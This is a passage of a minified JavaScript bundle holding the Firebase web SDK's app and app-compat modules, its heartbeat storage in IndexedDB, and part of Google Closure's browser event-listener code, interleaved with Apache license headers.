in(r?IDBIndex:IDBObjectStore).prototype)||!i&&!PO.includes(n))return;const s=async function(e,...t){const s=this.transaction(e,i?"readwrite":"readonly");let o=s.store;return r&&(o=o.index(t.shift())),(await Promise.all([o[n](...t),i&&s.done]))[0]};return mp.set(t,s),s}RO((e=>({...e,get:(t,n,r)=>gw(t,n)||e.get(t,n,r),has:(t,n)=>!!gw(t,n)||e.has(t,n)})));
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
class LO{constructor(e){this.container=e}getPlatformInfoString(){return this.container.getProviders().map((e=>{if(FO(e)){const t=e.getImmediate();return`${t.library}/${t.version}`}return null})).filter((e=>e)).join(" ")}}function FO(e){const t=e.getComponent();return"VERSION"===(null==t?void 0:t.type)}const $m="@firebase/app",yw="0.9.9",Fs=new xy("@firebase/app"),VO="@firebase/app-compat",UO="@firebase/analytics-compat",zO="@firebase/analytics",BO="@firebase/app-check-compat",jO="@firebase/app-check",qO="@firebase/auth",YO="@firebase/auth-compat",WO="@firebase/database",GO="@firebase/database-compat",HO="@firebase/functions",KO="@firebase/functions-compat",QO="@firebase/installations",XO="@firebase/installations-compat",JO="@firebase/messaging",ZO="@firebase/messaging-compat",eP="@firebase/performance",tP="@firebase/performance-compat",nP="@firebase/remote-config",rP="@firebase/remote-config-compat",iP="@firebase/storage",sP="@firebase/storage-compat",oP="@firebase/firestore",aP="@firebase/firestore-compat",lP="firebase",uP="9.21.0",Oi="[DEFAULT]",cP={[$m]:"fire-core",[VO]:"fire-core-compat",[zO]:"fire-analytics",[UO]:"fire-analytics-compat",[jO]:"fire-app-check",[BO]:"fire-app-check-compat",[qO]:"fire-auth",[YO]:"fire-auth-compat",[WO]:"fire-rtdb",[GO]:"fire-rtdb-compat",[HO]:"fire-fn",[KO]:"fire-fn-compat",[QO]:"fire-iid",[XO]:"fire-iid-compat",[JO]:"fire-fcm",[ZO]:"fire-fcm-compat",[eP]:"fire-perf",[tP]:"fire-perf-compat",[nP]:"fire-rc",[rP]:"fire-rc-compat",[iP]:"fire-gcs",[sP]:"fire-gcs-compat",[oP]:"fire-fst",[aP]:"fire-fst-compat","fire-js":"fire-js",[lP]:"fire-js-all"},Pi=new Map,Xl=new Map;
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function Lh(e,t){try{e.container.addComponent(t)}catch(n){Fs.debug(`Component ${t.name} failed to register with FirebaseApp ${e.name}`,n)}}function b2(e,t){e.container.addOrOverwriteComponent(t)}function na(e){const t=e.name;if(Xl.has(t))return Fs.debug(`There were multiple attempts to register component ${t}.`),!1;Xl.set(t,e);for(const t of Pi.values())Lh(t,e);return!0}function O2(e,t){const n=e.container.getProvider("heartbeat").getImmediate({optional:!0});return n&&n.triggerHeartbeat(),e.container.getProvider(t)}function hP(e,t,n=Oi){O2(e,t).clearInstance(n)}function dP(){Xl.clear()}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const fP={"no-app":"No Firebase App '{$appName}' has been created - call Firebase App.initializeApp()","bad-app-name":"Illegal App name: '{$appName}","duplicate-app":"Firebase App named '{$appName}' already exists with different options or config","app-deleted":"Firebase App named '{$appName}' already deleted","no-options":"Need to provide options, when not being deployed to hosting via source.","invalid-app-argument":"firebase.{$appName}() takes either no argument or a Firebase App instance.","invalid-log-argument":"First argument to `onLog` must be null or a function.","idb-open":"Error thrown when opening IndexedDB. Original error: {$originalErrorMessage}.","idb-get":"Error thrown when reading from IndexedDB. Original error: {$originalErrorMessage}.","idb-set":"Error thrown when writing to IndexedDB. Original error: {$originalErrorMessage}.","idb-delete":"Error thrown when deleting from IndexedDB. Original error: {$originalErrorMessage}."},Br=new Cd("app","Firebase",fP);
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */let pP=class{constructor(e,t,n){this._isDeleted=!1,this._options=Object.assign({},e),this._config=Object.assign({},t),this._name=t.name,this._automaticDataCollectionEnabled=t.automaticDataCollectionEnabled,this._container=n,this.container.addComponent(new Ls("app",(()=>this),"PUBLIC"))}get automaticDataCollectionEnabled(){return this.checkDestroyed(),this._automaticDataCollectionEnabled}set automaticDataCollectionEnabled(e){this.checkDestroyed(),this._automaticDataCollectionEnabled=e}get name(){return this.checkDestroyed(),this._name}get options(){return this.checkDestroyed(),this._options}get config(){return this.checkDestroyed(),this._config}get container(){return this._container}get isDeleted(){return this._isDeleted}set isDeleted(e){this._isDeleted=e}checkDestroyed(){if(this.isDeleted)throw Br.create("app-deleted",{appName:this._name})}};
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const ky=uP;function Dy(e,t={}){let n=e;"object"!=typeof t&&(t={name:t});const r=Object.assign({name:Oi,automaticDataCollectionEnabled:!1},t),i=r.name;if("string"!=typeof i||!i)throw Br.create("bad-app-name",{appName:String(i)});if(n||(n=iO()),!n)throw Br.create("no-options");const s=Pi.get(i);if(s){if(bm(n,s.options)&&bm(r,s.config))return s;throw Br.create("duplicate-app",{appName:i})}const o=new SO(i);for(const e of Xl.values())o.addComponent(e);const a=new pP(n,r,o);return Pi.set(i,a),a}function mP(e=Oi){const t=Pi.get(e);if(!t&&e===Oi)return Dy();if(!t)throw Br.create("no-app",{appName:e});return t}function gP(){return Array.from(Pi.values())}async function P2(e){const t=e.name;Pi.has(t)&&(Pi.delete(t),await Promise.all(e.container.getProviders().map((e=>e.delete()))),e.isDeleted=!0)}function Mi(e,t,n){var r;let i=null!==(r=cP[e])&&void 0!==r?r:e;n&&(i+=`-${n}`);const s=i.match(/\s|\//),o=t.match(/\s|\//);if(s||o){const e=[`Unable to register library "${i}" with version "${t}":`];return s&&e.push(`library name "${i}" contains illegal characters (whitespace or "/")`),s&&o&&e.push("and"),o&&e.push(`version name "${t}" contains illegal characters (whitespace or "/")`),void Fs.warn(e.join(" "))}na(new Ls(`${i}-version`,(()=>({library:i,version:t})),"VERSION"))}function $2(e,t){if(null!==e&&"function"!=typeof e)throw Br.create("invalid-log-argument");IO(e,t)}function L2(e){xO(e)}
/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const yP="firebase-heartbeat-database",vP=1,Jl="firebase-heartbeat-store";let gp=null;function F2(){return gp||(gp=OO(yP,1,{upgrade:(e,t)=>{switch(t){case 0:e.createObjectStore(Jl)}}}).catch((e=>{throw Br.create("idb-open",{originalErrorMessage:e.message})}))),gp}async function wP(e){try{return(await F2()).transaction(Jl).objectStore(Jl).get(V2(e))}catch(e){if(e instanceof Js)Fs.warn(e.message);else{const t=Br.create("idb-get",{originalErrorMessage:null==e?void 0:e.message});Fs.warn(t.message)}}}async function vw(e,t){try{const n=(await F2()).transaction(Jl,"readwrite");return await n.objectStore(Jl).put(t,V2(e)),n.done}catch(e){if(e instanceof Js)Fs.warn(e.message);else{const t=Br.create("idb-set",{originalErrorMessage:null==e?void 0:e.message});Fs.warn(t.message)}}}function V2(e){return`${e.name}!${e.options.appId}`
/**
 * @license
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */}const SP=1024,_P=2592e6;class EP{constructor(e){this.container=e,this._heartbeatsCache=null;const t=this.container.getProvider("app").getImmediate();this._storage=new xP(t),this._heartbeatsCachePromise=this._storage.read().then((e=>(this._heartbeatsCache=e,e)))}async triggerHeartbeat(){const e=this.container.getProvider("platform-logger").getImmediate().getPlatformInfoString(),t=ww();if(null===this._heartbeatsCache&&(this._heartbeatsCache=await this._heartbeatsCachePromise),this._heartbeatsCache.lastSentHeartbeatDate!==t&&!this._heartbeatsCache.heartbeats.some((e=>e.date===t)))return this._heartbeatsCache.heartbeats.push({date:t,agent:e}),this._heartbeatsCache.heartbeats=this._heartbeatsCache.heartbeats.filter((e=>{const t=new Date(e.date).valueOf();return Date.now()-t<=_P})),this._storage.overwrite(this._heartbeatsCache)}async getHeartbeatsHeader(){if(null===this._heartbeatsCache&&await this._heartbeatsCachePromise,null===this._heartbeatsCache||0===this._heartbeatsCache.heartbeats.length)return"";const e=ww(),{heartbeatsToSend:t,unsentEntries:n}=TP(this._heartbeatsCache.heartbeats),r=Ph(JSON.stringify({version:2,heartbeats:t}));return this._heartbeatsCache.lastSentHeartbeatDate=e,n.length>0?(this._heartbeatsCache.heartbeats=n,await this._storage.overwrite(this._heartbeatsCache)):(this._heartbeatsCache.heartbeats=[],this._storage.overwrite(this._heartbeatsCache)),r}}function ww(){return(new Date).toISOString().substring(0,10)}function TP(e,t=SP){const n=[];let r=e.slice();for(const i of e){const e=n.find((e=>e.agent===i.agent));if(e){if(e.dates.push(i.date),Sw(n)>t){e.dates.pop();break}}else if(n.push({agent:i.agent,dates:[i.date]}),Sw(n)>t){n.pop();break}r=r.slice(1)}return{heartbeatsToSend:n,unsentEntries:r}}class xP{constructor(e){this.app=e,this._canUseIndexedDBPromise=this.runIndexedDBEnvironmentCheck()}async runIndexedDBEnvironmentCheck(){return!!N2()&&cO().then((()=>!0)).catch((()=>!1))}async read(){return await this._canUseIndexedDBPromise&&await wP(this.app)||{heartbeats:[]}}async overwrite(e){var t;if(await this._canUseIndexedDBPromise){const n=await this.read();return vw(this.app,{lastSentHeartbeatDate:null!==(t=e.lastSentHeartbeatDate)&&void 0!==t?t:n.lastSentHeartbeatDate,heartbeats:e.heartbeats})}}async add(e){var t;if(await this._canUseIndexedDBPromise){const n=await this.read();return vw(this.app,{lastSentHeartbeatDate:null!==(t=e.lastSentHeartbeatDate)&&void 0!==t?t:n.lastSentHeartbeatDate,heartbeats:[...n.heartbeats,...e.heartbeats]})}}}function Sw(e){return Ph(JSON.stringify({version:2,heartbeats:e})).length}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function IP(e){na(new Ls("platform-logger",(e=>new LO(e)),"PRIVATE")),na(new Ls("heartbeat",(e=>new EP(e)),"PRIVATE")),Mi($m,yw,e),Mi($m,yw,"esm2017"),Mi("fire-js","")}IP("");const kP=Object.freeze(Object.defineProperty({__proto__:null,FirebaseError:Js,SDK_VERSION:ky,_DEFAULT_ENTRY_NAME:Oi,_addComponent:Lh,_addOrOverwriteComponent:b2,_apps:Pi,_clearComponents:dP,_components:Xl,_getProvider:O2,_registerComponent:na,_removeServiceInstance:hP,deleteApp:P2,getApp:mP,getApps:gP,initializeApp:Dy,onLog:$2,registerVersion:Mi,setLogLevel:L2},Symbol.toStringTag,{value:"Module"}));
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */class DP{constructor(e,t){this._delegate=e,this.firebase=t,Lh(e,new Ls("app-compat",(()=>this),"PUBLIC")),this.container=e.container}get automaticDataCollectionEnabled(){return this._delegate.automaticDataCollectionEnabled}set automaticDataCollectionEnabled(e){this._delegate.automaticDataCollectionEnabled=e}get name(){return this._delegate.name}get options(){return this._delegate.options}delete(){return new Promise((e=>{this._delegate.checkDestroyed(),e()})).then((()=>(this.firebase.INTERNAL.removeApp(this.name),P2(this._delegate))))}_getService(e,t=Oi){var n;this._delegate.checkDestroyed();const r=this._delegate.container.getProvider(e);return!r.isInitialized()&&"EXPLICIT"===(null===(n=r.getComponent())||void 0===n?void 0:n.instantiationMode)&&r.initialize(),r.getImmediate({identifier:t})}_removeServiceInstance(e,t=Oi){this._delegate.container.getProvider(e).clearInstance(t)}_addComponent(e){Lh(this._delegate,e)}_addOrOverwriteComponent(e){b2(this._delegate,e)}toJSON(){return{name:this.name,automaticDataCollectionEnabled:this.automaticDataCollectionEnabled,options:this.options}}}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */const CP={"no-app":"No Firebase App '{$appName}' has been created - call Firebase App.initializeApp()","invalid-app-argument":"firebase.{$appName}() takes either no argument or a Firebase App instance."},_w=new Cd("app-compat","Firebase",CP);
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function NP(e){const t={},n={__esModule:!0,initializeApp:function(r,i={}){const s=Dy(r,i);if(dw(t,s.name))return t[s.name];const o=new e(s,n);return t[s.name]=o,o},app:r,registerVersion:Mi,setLogLevel:L2,onLog:$2,apps:null,SDK_VERSION:ky,INTERNAL:{registerComponent:function(t){const i=t.name,s=i.replace("-compat","");if(na(t)&&"PUBLIC"===t.type){const o=(e=r())=>{if("function"!=typeof e[s])throw _w.create("invalid-app-argument",{appName:i});return e[s]()};void 0!==t.serviceProps&&$h(o,t.serviceProps),n[s]=o,e.prototype[s]=function(...e){return this._getService.bind(this,i).apply(this,t.multipleInstances?e:[])}}return"PUBLIC"===t.type?n[s]:null},removeApp:function(e){delete t[e]},useAsService:function(e,t){return"serverAuth"===t?null:t},modularAPIs:kP}};function r(e){if(!dw(t,e=e||Oi))throw _w.create("no-app",{appName:e});return t[e]}return n.default=n,Object.defineProperty(n,"apps",{get:function(){return Object.keys(t).map((e=>t[e]))}}),r.App=e,n}
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */function U2(){const e=NP(DP);return e.INTERNAL=Object.assign(Object.assign({},e.INTERNAL),{createFirebaseNamespace:U2,extendNamespace:function(t){$h(e,t)},createSubscribe:pO,ErrorFactory:Cd,deepExtend:$h}),e}const MP=U2(),Ew=new xy("@firebase/app-compat"),RP="@firebase/app-compat",AP="0.2.9";
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
/**
 * @license
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
function bP(e){Mi(RP,AP,e)}
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */if(lO()&&void 0!==self.firebase){Ew.warn("\n    Warning: Firebase is already defined in the global scope. Please make sure\n    Firebase library is only loaded once.\n  ");const e=self.firebase.SDK_VERSION;e&&e.indexOf("LITE")>=0&&Ew.warn("\n    Warning: You are trying to load Firebase while using Firebase Performance standalone script.\n    You should load Firebase Performance with this instance of Firebase to avoid loading duplicate code.\n    ")}const Cy=MP;bP();var OP="firebase",PP="9.21.0";
/**
 * @license
 * Copyright 2020 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */Cy.registerVersion(OP,PP,"app-compat");var W,$P=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{},Ny=Ny||{},le=$P||self;function Fh(){}function Nd(e){var t=typeof e;return"array"==(t="object"!=t?t:e?Array.isArray(e)?"array":t:"null")||"object"==t&&"number"==typeof e.length}function Iu(e){var t=typeof e;return"object"==t&&null!=e||"function"==t}function LP(e){return Object.prototype.hasOwnProperty.call(e,yp)&&e[yp]||(e[yp]=++FP)}var yp="closure_uid_"+(1e9*Math.random()>>>0),FP=0;function VP(e,t,n){return e.call.apply(e.bind,arguments)}function UP(e,t,n){if(!e)throw Error();if(2<arguments.length){var r=Array.prototype.slice.call(arguments,2);return function(){var n=Array.prototype.slice.call(arguments);return Array.prototype.unshift.apply(n,r),e.apply(t,n)}}return function(){return e.apply(t,arguments)}}function nn(e,t,n){return(nn=Function.prototype.bind&&-1!=Function.prototype.bind.toString().indexOf("native code")?VP:UP).apply(null,arguments)}function kc(e,t){var n=Array.prototype.slice.call(arguments,1);return function(){var t=n.slice();return t.push.apply(t,arguments),e.apply(this,t)}}function Lt(e,t){function n(){}n.prototype=t.prototype,e.$=t.prototype,e.prototype=new n,e.prototype.constructor=e,e.ac=function(e,n,r){for(var i=Array(arguments.length-2),s=2;s<arguments.length;s++)i[s-2]=arguments[s];return t.prototype[n].apply(e,i)}}function Hi(){this.s=this.s,this.o=this.o}var zP=0;Hi.prototype.s=!1,Hi.prototype.ra=function(){!this.s&&(this.s=!0,this.N(),0!=zP)&&LP(this)},Hi.prototype.N=function(){if(this.o)for(;this.o.length;)this.o.shift()()};const z2=Array.prototype.indexOf?function(e,t){return Array.prototype.indexOf.call(e,t,void 0)}:function(e,t){if("string"==typeof e)return"string"!=typeof t||1!=t.length?-1:e.indexOf(t,0);for(let n=0;n<e.length;n++)if(n in e&&e[n]===t)return n;return-1};function My(e){const t=e.length;if(0<t){const n=Array(t);for(let r=0;r<t;r++)n[r]=e[r];return n}return[]}function Tw(e,t){for(let t=1;t<arguments.length;t++){const n=arguments[t];if(Nd(n)){const t=e.length||0,r=n.length||0;e.length=t+r;for(let i=0;i<r;i++)e[t+i]=n[i]}else e.push(n)}}function rn(e,t){this.type=e,this.g=this.target=t,this.defaultPrevented=!1}rn.prototype.h=function(){this.defaultPrevented=!0};var BP=function(){if(!le.addEventListener||!Object.defineProperty)return!1;var e=!1,t=Object.defineProperty({},"passive",{get:function(){e=!0}});try{le.addEventListener("test",Fh,t),le.removeEventListener("test",Fh,t)}catch{}return e}();function Vh(e){return/^[\s\xa0]*$/.test(e)}var xw=String.prototype.trim?function(e){return e.trim()}:function(e){return/^[\s\xa0]*([\s\S]*?)[\s\xa0]*$/.exec(e)[1]};function vp(e,t){return e<t?-1:e>t?1:0}function Md(){var e=le.navigator;return e&&(e=e.userAgent)?e:""}function dr(e){return-1!=Md().indexOf(e)}function Ry(e){return Ry[" "](e),e}function B2(e,t,n){return Object.prototype.hasOwnProperty.call(e,t)?e[t]:e[t]=n(t)}Ry[" "]=Fh;var Uh,jP=dr("Opera"),ra=dr("Trident")||dr("MSIE"),j2=dr("Edge"),Lm=j2||ra,q2=dr("Gecko")&&!(-1!=Md().toLowerCase().indexOf("webkit")&&!dr("Edge"))&&!(dr("Trident")||dr("MSIE"))&&!dr("Edge"),qP=-1!=Md().toLowerCase().indexOf("webkit")&&!dr("Edge");function Y2(){var e=le.document;return e?e.documentMode:void 0}e:{var wp="",Sp=function(){var e=Md();return q2?/rv:([^\);]+)(\)|;)/.exec(e):j2?/Edge\/([\d\.]+)/.exec(e):ra?/\b(?:MSIE|rv)[: ]([^\);]+)(\)|;)/.exec(e):qP?/WebKit\/(\S+)/.exec(e):jP?/(?:Version)[ \/]?(\S+)/.exec(e):void 0}();if(Sp&&(wp=Sp?Sp[1]:""),ra){var _p=Y2();if(null!=_p&&_p>parseFloat(wp)){Uh=String(_p);break e}}Uh=wp}var Fm,YP={};function WP(){return B2(YP,9,(function(){let e=0;const t=xw(String(Uh)).split("."),n=xw("9").split("."),r=Math.max(t.length,n.length);for(let o=0;0==e&&o<r;o++){var i=t[o]||"",s=n[o]||"";do{if(i=/(\d*)(\D*)(.*)/.exec(i)||["","","",""],s=/(\d*)(\D*)(.*)/.exec(s)||["","","",""],0==i[0].length&&0==s[0].length)break;e=vp(0==i[1].length?0:parseInt(i[1],10),0==s[1].length?0:parseInt(s[1],10))||vp(0==i[2].length,0==s[2].length)||vp(i[2],s[2]),i=i[3],s=s[3]}while(0==e)}return 0<=e}))}if(le.document&&ra){var Iw=Y2();Fm=Iw||parseInt(Uh,10)||void 0}else Fm=void 0;var GP=Fm;function Zl(e,t){if(rn.call(this,e?e.type:""),this.relatedTarget=this.g=this.target=null,this.button=this.screenY=this.screenX=this.clientY=this.clientX=0,this.key="",this.metaKey=this.shiftKey=this.altKey=this.ctrlKey=!1,this.state=null,this.pointerId=0,this.pointerType="",this.i=null,e){var n=this.type=e.type,r=e.changedTouches&&e.changedTouches.length?e.changedTouches[0]:null;if(this.target=e.target||e.srcElement,this.g=t,t=e.relatedTarget){if(q2){e:{try{Ry(t.nodeName);var i=!0;break e}catch{}i=!1}i||(t=null)}}else"mouseover"==n?t=e.fromElement:"mouseout"==n&&(t=e.toElement);this.relatedTarget=t,r?(this.clientX=void 0!==r.clientX?r.clientX:r.pageX,this.clientY=void 0!==r.clientY?r.clientY:r.pageY,this.screenX=r.screenX||0,this.screenY=r.screenY||0):(this.clientX=void 0!==e.clientX?e.clientX:e.pageX,this.clientY=void 0!==e.clientY?e.clientY:e.pageY,this.screenX=e.screenX||0,this.screenY=e.screenY||0),this.button=e.button,this.key=e.key||"",this.ctrlKey=e.ctrlKey,this.altKey=e.altKey,this.shiftKey=e.shiftKey,this.metaKey=e.metaKey,this.pointerId=e.pointerId||0,this.pointerType="string"==typeof e.pointerType?e.pointerType:HP[e.pointerType]||"",this.state=e.state,this.i=e,e.defaultPrevented&&Zl.$.h.call(this)}}Lt(Zl,rn);var HP={2:"touch",3:"pen",4:"mouse"};Zl.prototype.h=function(){Zl.$.h.call(this);var e=this.i;e.preventDefault?e.preventDefault():e.returnValue=!1};var ku="closure_listenable_"+(1e6*Math.random()|0),KP=0;function QP(e,t,n,r,i){this.listener=e,this.proxy=null,this.src=t,this.type=n,this.capture=!!r,this.la=i,this.key=++KP,this.fa=this.ia=!1}function Rd(e){e.fa=!0,e.listener=null,e.proxy=null,e.src=null,e.la=null}function Ay(e,t,n){for(const r in e)t.call(n,e[r],r,e)}function W2(e){const t={};for(const n in e)t[n]=e[n];return t}const kw="constructor hasOwnProperty isPrototypeOf propertyIsEnumerable toLocaleString toString valueOf".split(" ");function G2(e,t){let n,r;for(let t=1;t<arguments.length;t++){for(n in r=arguments[t],r)e[n]=r[n];for(let t=0;t<kw.length;t++)n=kw[t],Object.prototype.hasOwnProperty.call(r,n)&&(e[n]=r[n])}}function Ad(e){this.src=e,this.g={},this.h=0}function Vm(e,t){var n=t.type;if(n in e.g){var r,i=e.g[n],s=z2(i,t);(r=0<=s)&&Array.prototype.splice.call(i,s,1),r&&(Rd(t),0==e.g[n].length&&(delete e.g[n],e.h--))}}function Um(e,t,n,r){for(var i=0;i<e.length;++i){var s=e[i];if(!s.fa&&s.listener==t&&s.capture==!!n&&s.la==r)return i}return-1}Ad.prototype.add=function(e,t,n,r,i){var s=e.toString();(e=this.g[s])||(e=this.g[s]=[],this.h++);var o=Um(e,t,r,i);return-1<o?(t=e[o],n||(t.ia=!1)):((t=new QP(t,this.src,s,!!r,i)).ia=n,e.push(t)),t};var by="closure_lm_"+(1e6*Math.random()|0),Ep={};function H2(e,t,n,r,i){if(r&&r.once)return Q2(e,t,n,r,i);if(Array.isArray(t)){for(var s=0;s<t.length;s++)H2(e,t[s],n,r,i);return null}return n=$y(n),e&&e[ku]?e.O(t,n,Iu(r)?!!r.capture:!!r,i):K2(e,t,n,!1,r,i)}function K2(e,t,n,r,i,s){if(!t)throw Error("Invalid event type");var o=Iu(i)?!!i.capture:!!i,a=Py(e);if(a||(e[by]=a=new Ad(e)),(n=a.add(t,n,r,o,s)).proxy)return n;if(r=XP(),n.proxy=r,r.src=e,r.listener=n,e.addEventListener)BP||(i=o),void 0===i&&(i=!1),e.addEventListener(t.toString(),r,i);else if(e.attachEvent)e.attachEvent(J2(t.toString()),r);else{if(!e.addListener||!e.removeListener)throw Error("addEventListener and attachEvent are unavailable.");e.addListener(r)}return n}function XP(){const e=JP;return function t(n){return e.call(t.src,t.listener,n)}}function Q2(e,t,n,r,i){if(Array.isArray(t)){for(var s=0;s<t.length;s++)Q2(e,t[s],n,r,i);return null}return n=$y(n),e&&e[ku]?e.P(t,n,Iu(r)?!!r.capture:!!r,i):K2(e,t,n,!0,r,i)}function X2(e,t,n,r,i){if(Array.isArray(t))for(var s=0;s<t.length;s++)X2(e,t[s],n,r,i);else r=Iu(r)?!!r.capture:!!r,n=$y(n),e&&e[ku]?(e=e.i,(t=String(t).toString())in e.g&&(-1<(n=Um(s=e.g[t],n,r,i))&&(Rd(s[n]),Array.prototype.splice.call(s,n,1),0==s.length&&(delete e.g[t],e.h--)))):e&&(e=Py(e))&&(t=e.g[t.toString()],e=-1,t&&(e=Um(t,n,r,i)),(n=-1<e?t[e]:null)&&Oy(n))}function Oy(e){if("number"!=typeof e&&e&&!e.fa){var t=e.src;if(t&&t[ku])Vm(t.i,e);else{var 